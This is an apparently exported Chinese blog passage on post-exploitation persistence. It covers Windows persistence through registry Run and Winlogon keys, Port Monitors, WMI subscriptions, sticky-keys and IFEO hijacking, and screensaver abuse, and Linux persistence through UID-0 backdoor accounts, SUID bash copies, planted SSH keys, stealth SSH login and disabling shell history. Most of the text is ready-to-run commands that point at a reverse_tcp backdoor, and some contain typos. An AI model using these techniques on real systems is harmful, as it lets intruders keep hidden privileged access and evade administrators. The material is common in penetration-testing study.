<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将在当前用户登陆时启动</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">将在所有用户登陆时启动</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure></div>

<p>执行的命令，表示在注册表运行键中添加一个叫backdoor的键，并且指向后门文件的绝对路径</p>
<p><code>reg add &quot;HKEY_CURRENT_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v backdoor /t REG_SZ /D &quot;C:\Windows\System32\reverse_TCP.exe&quot;</code></p>
<h6 id="3-Winlogon-Helper"><a href="#3-Winlogon-Helper" class="headerlink" title="3.Winlogon Helper"></a>3.Winlogon Helper</h6><p>这个是一个Windows系统组件，处理一系列与用户有关的行为，这些行为在注册表中，并且定义了在Windows登录期间会启动那些进程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定用户登录时执行的和用户初始化程序，默认是userinit.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line">指定windows身份验证期间执行的程序，默认为explorer.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br></pre></td></tr></table></figure></div>

<p>执行命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\reverse_tcp.exe&quot; /f</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818175945140.png"
                      alt="image-20230818175945140"
                ></p>
<p>注意：在利用这两个键时需要保留原有的程序，可以将后门添加到原有程序后面以“，”分隔就行，并且需要上传到C:\Windows\System32文件夹中，不要向以上那样操作，会导致explorer.exe启动不了进不了桌面，以逗号分割进行添加</p>
<h3 id="Port-Monitors"><a href="#Port-Monitors" class="headerlink" title="Port Monitors"></a>Port Monitors</h3><p>打印机后台处理服务负责管理Windows系统的打印作业</p>
<p>主要是依靠他之中的AddMonitor函数将DLL注入spoolsv.exe进程</p>
<p>1.通过msf生成一个64位的DLL恶意木马</p>
<p>2.将这个文件上传到目标主机的C:\Windows\System32目录中</p>
<p>执行<code>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor&quot; /v &quot;Driver&quot; /t REG_SZ /d &quot;reverse_tcp.dll&quot;</code></p>
<p>当系统启动的时候，print spooler服务在启动过程会读取Monitors注册表项的所有子键，并且以SYSTEM权限加载Driver键值所指定的DLL文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820155151574.png"
                      alt="image-20230820155151574"
                ></p>
<h3 id="利用WMI订阅事件"><a href="#利用WMI订阅事件" class="headerlink" title="利用WMI订阅事件"></a>利用WMI订阅事件</h3><h6 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><h6 id="2-相关辅助工具"><a href="#2-相关辅助工具" class="headerlink" title="2.相关辅助工具"></a>2.相关辅助工具</h6><p>利用Sharp-WMIEvent工具，可以实现持久化功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\Windows\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>这表示在主机上部署一个永久性的订阅事件，每当用户登录时就会调用，远程主机就会上线</p>
<p>此外msf还包含一个内置框架也可以通过WMI实现持久性的模块，exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence，支持的选项不同，可以用于在特定的事件触发时在系统上执行任意攻击载荷</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820160310693.png"
                      alt="image-20230820160310693"
                ></p>
<p>获取反弹shell之后就可以指定session进行攻击</p>
<h3 id="利用系统辅助功能"><a href="#利用系统辅助功能" class="headerlink" title="利用系统辅助功能"></a>利用系统辅助功能</h3><p>一般Windows系统会有许多组合快捷键来达到某种功能如Windows+“+”、Windows+U等</p>
<p>最常用的时连按五次shift打开粘滞键sethc.exe程序</p>
<p>通常将cmd.exe伪装成sethc.exe，此方法需要管理员权限</p>
<h6 id="1-手动利用-1"><a href="#1-手动利用-1" class="headerlink" title="1.手动利用"></a>1.手动利用</h6><p>在高版本Windows中，C:\Windows\System32目录下的文件收到系统的保护，只有TrustedInstaller权限用户才对其中的问价拥有修改和写入权限，所以在这之前需要通过令牌窃取提升至TrustedInstaller权限。</p>
<p>获取后执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd C:\Windows\System32</span><br><span class="line">move sethc.exe sethc.exe.bak      将文件sethc.exe重命名</span><br><span class="line">copy cmd.exe sethc.exe            将一个cmd.exe副本伪装成sethc.exe</span><br></pre></td></tr></table></figure></div>

<p>这时候连按五次shift键就可以开启cmd.exe，权限为SYSTEM</p>
<h6 id="2-RDP劫持"><a href="#2-RDP劫持" class="headerlink" title="2.RDP劫持"></a>2.RDP劫持</h6><h3 id="IFEO注入"><a href="#IFEO注入" class="headerlink" title="IFEO注入"></a>IFEO注入</h3><p>IFEO是Windows系统的一个注册表项，位于HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options中，负责为一些在默认系统环境中运行时可能引发错误的程序执行提供一个特殊的环境设定</p>
<p>映像劫持是利用Windows的IFEO（Image File Execution  Options）功能来实现的。IFEO实际上是Windows的一项正常功能，主要用于调试程序，其初衷是在程序启动的时候开启调试器来调试程序，这样一来可以在调试器中观察程序在难以重现的环境中的行为。</p>
<p>简单来说就是，通过修改程序指定的注册表实现程序的劫持，当运行程序的时候实际上运行的是我们留的后门程序。</p>
<p>一个程序当要运行的时候，会去检查注册表，如果有指定的程序并且开启了debugger，那么会优先执行debuggr指定的程序，这样就会造成映像劫持。</p>
<h6 id="1-Debugger"><a href="#1-Debugger" class="headerlink" title="1.Debugger"></a>1.Debugger</h6><p>当用户启动计算机后，系统就会在注册表中的IEFO中查询所有的程序的子键，如果存在与该程序名相同的子键就会读取相应的Debugger键值，如果键值没被设置就不做处理，否则则将键值所对应的路径作为程序的启动路径来代替原始程序，简单说debugger的优先级比较高</p>
<p>可以联想到上面的粘滞键，测试人员就可以修改粘滞键注册表信息来创建后门，就不需要TrustedInstaller权限</p>
<p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>向Image File Execution Options注册表项中添加映像劫持子键，并将“Debugger”的值设置为要执行的程序即可</p>
<p>然后连按5次就可以成功弹出命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820161427352.png"
                      alt="image-20230820161427352"
                ></p>
<p>连按五次shift</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820161512300.png"
                      alt="image-20230820161512300"
                ></p>
<h6 id="2-GlobalFlag"><a href="#2-GlobalFlag" class="headerlink" title="2.GlobalFlag"></a>2.GlobalFlag</h6><p>IFEO还可以指定程序静默退出时启动任意监控程序</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">启用对记事本进程的静默推出监视</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line">启用Windows错误报告进程WarFault.exe，它将成为reverse_tcp.exe的父进程</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line">将监视器设为reverse_tcp.exe</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Winodws\System32\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p>这样用户打开记事本之后正常运行，但是关闭记事本时将在WerFault.exe进程中创建子进程以运行后门程序reverse_tcp.exe</p>
<p><strong>实操</strong></p>
<p>这边利用开启cmd.exe来测试</p>
<p>启用对记事本进程的静默推出监视</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820161730300.png"
                      alt="image-20230820161730300"
                ></p>
<p>启用Windows错误报告进程WarFault.exe，它将成为cmd.exe的父进程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820161803575.png"
                      alt="image-20230820161803575"
                ></p>
<p>将监视器设为cmd.exe</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820161839957.png"
                      alt="image-20230820161839957"
                ></p>
<p>然后打开记事本，然后关了</p>
<p>但是运行不出来，很奇怪恩恩恩恩额</p>
<h3 id="利用屏幕保护程序"><a href="#利用屏幕保护程序" class="headerlink" title="利用屏幕保护程序"></a>利用屏幕保护程序</h3><p>屏幕保护时Windows的一种功能，保护程序具有.scr扩展文件名组成的可执行文件</p>
<p>位于HKEY_CURRENT_USER\Control Panel\Desktop</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230324084138795.png"
                      alt="image-20230324084138795"
                ></p>
<p>我们就可以通过编辑注册表，修改scrnsave.exe的键的值，即修改路径</p>
<p>实现触发屏幕保护程序，实现后门触发</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将触发屏幕保护程序时执行的程序自定义为恶意程序，这里可以以.scr或.exe结尾的都可以</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Windwos\System32\reverse_tcp.scr&quot;</span><br><span class="line">启用屏幕保护</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1</span><br><span class="line">设置不需要密码</span><br><span class="line">reg add &quot;HKEY_CURRENT_USERControl Panel\Desktop&quot; /v ScreenSaverIsSecure /t REG_SZ /d &quot;0&quot;</span><br><span class="line">将用户不活动的超时设为60秒</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER Control Panel\Desktop&quot; /v ScreenSaveTime0ut /t REG_SZ /d &quot;60&quot;</span><br></pre></td></tr></table></figure></div>

<p>这个不需要管理员权限，普通用户即可</p>
<p>还是以cmd.exe演示</p>
<p>将触发屏幕保护程序时执行的程序自定义为恶意程序，这里可以以.scr或.exe结尾的都可以</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820163628217.png"
                      alt="image-20230820163628217"
                ></p>
<p>启用屏幕保护</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820163316401.png"
                      alt="image-20230820163316401"
                ></p>
<p>设置不需要密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820163346811.png"
                      alt="image-20230820163346811"
                ></p>
<p>将用户不活动的超时设为60秒</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820163354291.png"
                      alt="image-20230820163354291"
                ></p>
<p>然后等待一分钟之后启动屏幕保护程序，就可以实现调用cmd.exe</p>
<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>DLL劫持的原理是将同名的恶意DLL文件放在合法的DLL文件所在路径的搜索位置中，当应用程序搜索DLL时，就会用恶意DLL代替合法的DLL来加载。需要管理员权限</p>
<h6 id="1-劫持应用程序"><a href="#1-劫持应用程序" class="headerlink" title="1.劫持应用程序"></a>1.劫持应用程序</h6>]]></content>
  </entry>
  <entry>
    <title>权限维持---Linux</title>
    <url>/2024/02/29/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-Linux/</url>
    <content><![CDATA[<h1 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h1><h2 id="特权账户"><a href="#特权账户" class="headerlink" title="特权账户"></a>特权账户</h2><p>在linux系统中，存在两个特殊的文件&#x2F;etc&#x2F;passwd 和&#x2F;etc&#x2F;shadow这两个文件中存储着用户名和加密后的密码</p>
<p>在目前的大多数的linux系统中，将加密后的用户密码放在&#x2F;etc&#x2F;shadow中但是&#x2F;etc&#x2F;shadow只能root用户查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821174608549.png"
                      alt="image-20230821174608549"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</span><br><span class="line"></span><br><span class="line">（1）用户名</span><br><span class="line">用户名，就是一串代表用户身份的字符串，用户名仅是为了方便用户记忆，Linux 系统是通过 UID 来识别用户身份，分配用户权限的。/etc/passwd 文件中就定义了用户名和 UID 之间的对应关系。</span><br><span class="line"></span><br><span class="line">（2）密码</span><br><span class="line">&quot;x&quot; 表示此用户设有密码，但不是真正的密码，真正的密码保存在 /etc/shadow 文件中</span><br><span class="line">在早期的UNIX中，这里保存的就是真正的加密密码串，但由于所有程序都能读取此文件，非常容易造成用户数据被窃取。虽然密码是加密的，但是采用暴力破解的方式也是能够进行破解的。</span><br><span class="line">因此，现在Linux系统把真正的加密密码串放置在/etc/shadow 文件中，此文件只有root用户可以浏览和操作，这样就最大限度地保证了密码的安全。</span><br><span class="line"></span><br><span class="line">（3）UID</span><br><span class="line">UID，也就是用户ID。每个用户都有唯一的一个UID，Linux系统通过UID来识别不同的用户。实际上，UID 就是一个0~65535之间的数，不同范围的数字表示不同的用户身份</span><br><span class="line"></span><br><span class="line">（4）GID</span><br><span class="line">全称“Group ID”，简称“组ID”，表示用户初始组的组ID号。在建立用户jack的同时，就会建立jack 组作为jack 用户的初始组。刚刚的jack用户除属于初始组jack外，我又把它加入了bob 组，那么jack 用户同时属于jack组和bob组，其中jack是初始组，bob是附加组。</span><br><span class="line"></span><br><span class="line">（5）描述性信息</span><br><span class="line">这个字段并没有什么重要的用途，只是用来解释这个用户的意义而已。</span><br><span class="line"></span><br><span class="line">（6）主目录</span><br><span class="line">也就是用户登录后有操作权限的访问目录，通常称为用户的主目录。</span><br><span class="line"></span><br><span class="line">（7）默认的Shell</span><br><span class="line">Shell就是Linux的命令解释器，是用户和Linux内核之间沟通的桥梁。Linux系统默认使用的命令解释器是bash（/bin/bash）</span><br></pre></td></tr></table></figure></div>

<p>&#x2F;etc&#x2F;shadow是只有root用户才能查看的，这样保证了系统的安全性</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821174825565.png"
                      alt="image-20230821174825565"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br><span class="line"></span><br><span class="line">（1）用户名 同 /etc/passwd 文件的用户名有相同的含义。</span><br><span class="line"></span><br><span class="line">（2）加密密码 这里保存的是真正加密的密码。</span><br><span class="line">目前 Linux 的密码采用的是 SHA512 散列加密算法，原来采用的是MD5 或 DES 加密算法。SHA512 散列加密算法的加密等级更高，也更加安全。 注意，这串密码产生的乱码不能手工修改，如果手工修改，系统将无法识别密码，导致密码失效。很多软件透过这个功能，在密码串前加上 &quot;!&quot;、&quot;&quot;或 &quot;x&quot; 使密码暂时失效。 所有伪用户的密码都是 &quot;!!&quot; 或 &quot;&quot;，代表没有密码是不能登录的。当然，新创建的用户如果不设定密码，那么它的密码项也是 &quot;!!&quot;，代表这个用户没有密码，不能登录。</span><br><span class="line"></span><br><span class="line">（3）最后一次修改时间 此字段表示最后一次修改密码的时间，可是，为什么 root 用户显示的是 15775 呢？ 这是因为，Linux 计算日期的时间是以 1970 年 1 月 1 日作为 1 不断累加得到的时间，到 1971 年 1 月 1 日，则为 366天。这里显示 15775 天，也就是说，此 root 账号在 1970 年 1 月 1 日之后的第 15775 天修改的 root 用户密码。</span><br><span class="line"></span><br><span class="line">（4）最小修改时间间隔 最小修改间隔时间，也就是说，该字段规定了从第 3 字段（最后一次修改密码的日期）起，多长时间之内不能修改密码。如果是 0，则密码可以随时修改；如果是 10，则代表密码修改后 10 天之内不能再次修改密码。此字段是为了针对某些人频繁更改账户密码而设计的。</span><br><span class="line"></span><br><span class="line">（5）密码有效期 经常变更密码是个好习惯，为了强制要求用户变更密码，这个字段可以指定距离第 3 字段（最后一次更改密码）多长时间内需要再次变更密码，否则该账户密码进行过期阶段。该字段的默认值为 99999，也就是273 年，可认为是永久生效。如果改为 90，则表示密码被修改 90 天之后必须再次修改，否则该用户即将过期。管理服务器时，通过这个字段强制用户定期修改密码。</span><br><span class="line"></span><br><span class="line">（6）密码需要变更前的警告天数 与第 5 字段相比较，当账户密码有效期快到时，系统会发出警告信息给此账户，提醒用户 &quot;再过 n 天你的密码就要过期了，请尽快重新设置你的密码！&quot;。该字段的默认值是7，也就是说，距离密码有效期的第 7 天开始，每次登录系统都会向该账户发出 &quot;修改密码&quot; 的警告信息。</span><br><span class="line"></span><br><span class="line">（7）密码过期后的宽限天数</span><br><span class="line">也称为“口令失效日”，简单理解就是，在密码过期后，用户如果还是没有修改密码，则在此字段规定的宽限天数内，用户还是可以登录系统的；如果过了宽限天数，系统将不再让此账户登陆，也不会提示账户过期，是完全禁用。比如说，此字段规定的宽限天数是 10，则代表密码过期 10 天后失效；如果是 0，则代表密码过期后立即失效；如果是 -1，则代表密码永远不会失效。</span><br><span class="line"></span><br><span class="line">（8）账号失效时间</span><br><span class="line">同第 3 个字段一样，使用自 1970 年 1 月 1 日以来的总天数作为账户的失效时间。该字段表示，账号在此字段规定的时间之外，不论你的密码是否过期，都将无法使用！该字段通常被使用在具有收费服务的系统中。</span><br><span class="line"></span><br><span class="line">（9）保留 这个字段目前没有使用，等待新功能的加入。</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这边演示添加一个特权账户</p>
<p>创建一个用户名hahaha，密码为123456的普通用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd -p &#x27;openssl passwd 1 -salt &#x27;salt&#x27; 123456&#x27; hahaha</span><br><span class="line"></span><br><span class="line"># useradd -p 方法 &#x27; &#x27;是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821175248583.png"
                      alt="image-20230821175248583"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821175302317.png"
                      alt="image-20230821175302317"
                ></p>
<p> 然而特权账户是在添加用户的时候将UID改为0</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd -p &#x27;openssl passwd -1 salt &#x27;salt&#x27; 123456&#x27; hahaha2 -o -u 0 -g root -G root -s /bin/bash -d /home/hahaha</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821175603683.png"
                      alt="image-20230821175603683"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821175616659.png"
                      alt="image-20230821175616659"
                ></p>
<p>这样就创建了一个特权账户，也就是root权限</p>
<p>查看用户组信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821175844218.png"
                      alt="image-20230821175844218"
                ></p>
<h2 id="后门用户-SUID-Shell"><a href="#后门用户-SUID-Shell" class="headerlink" title="后门用户+SUID Shell"></a>后门用户+SUID Shell</h2><p>查看用户组信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/group</span><br></pre></td></tr></table></figure></div>

<p>跟上面一样，创建管理员后门adm&#x2F;123456</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建root用户</span><br><span class="line">useradd -p &#x27;openssl passwd -1 -salt &#x27;salt&#x27; 123456&#x27; adm -o -u 0 -g root -G root -s /bin/bash -d /home/adm</span><br></pre></td></tr></table></figure></div>

<p>SUID是一种特殊权限，设置了suid的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限，例如程序文件的属主是root，那么执行该程序的用户就将暂时获得root账户的权限。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要有一下几点的注意</span><br><span class="line">1.只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义.</span><br><span class="line">2.命令执行者要对该程序文件拥有执行(x)权限.</span><br><span class="line">3.命令执行者在执行该程序时获得该程序文件属主的身份.</span><br><span class="line">4.SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</span><br></pre></td></tr></table></figure></div>



<p>普通用户+SUID Shell</p>
<p>首先进入root设置suid权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821183302518.png"
                      alt="image-20230821183302518"
                ></p>
<p>然后切换为普通用户hhh</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/shell -p</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821183326475.png"
                      alt="image-20230821183326475"
                ></p>
<p>在shell中执行即是root权限</p>
<h2 id="SSH服务-SSH私钥登陆"><a href="#SSH服务-SSH私钥登陆" class="headerlink" title="SSH服务-SSH私钥登陆"></a>SSH服务-SSH私钥登陆</h2><p>主要原理就是创建一个密钥对，然后目标主机配置公钥，攻击者就可以利用私钥进行登陆了</p>
<p>创建密钥对</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen    #生成密钥对</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821233005040.png"
                      alt="image-20230821233005040"
                ></p>
<p>赋予.ssh700的权限</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821233044416.png"
                      alt="image-20230821233044416"
                ></p>
<p>追加公钥</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd .ssh       #进入这个隐藏的文件中</span><br><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys      #将.ssh中的公钥文件追加到authorized_keys文件中</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821233051745.png"
                      alt="image-20230821233051745"
                ></p>
<p>然后进入&#x2F;etc&#x2F;ssh&#x2F;sshd_config修改配置文件，在文件最后添加这些</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line"></span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"></span><br><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821233323056.png"
                      alt="image-20230821233323056"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821233315956.png"
                      alt="image-20230821233315956"
                ></p>
<p>之后得重启SSH服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821233546347.png"
                      alt="image-20230821233546347"
                ></p>
<p>然后就将生成的私钥下载下来id_rsa通过私钥连接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821234804248.png"
                      alt="image-20230821234804248"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821234603466.png"
                      alt="image-20230821234603466"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821234527405.png"
                      alt="image-20230821234527405"
                ></p>
<h2 id="SSH隐身登陆"><a href="#SSH隐身登陆" class="headerlink" title="SSH隐身登陆"></a>SSH隐身登陆</h2><p>影身登陆系统，这样不会被last who w等指令检测到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -l</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230821235228882.png"
                      alt="image-20230821235228882"
                ></p>
<p>关闭历史命令记录，这样就不会被管理员发现命令攻击痕迹</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br></pre></td></tr></table></figure></div>

<p>这个命令输进去就行了</p>
<h2 id="SSH-PAM临时端口后门"><a href="#SSH-PAM临时端口后门" class="headerlink" title="SSH PAM临时端口后门"></a>SSH PAM临时端口后门</h2><p>ssh配置中开启了PAM进行身份验证（默认开启）</p>
<p>也就是软连接，可以使用任意密码登陆</p>
<p>查看是否使用PAM进行身份验证</p>
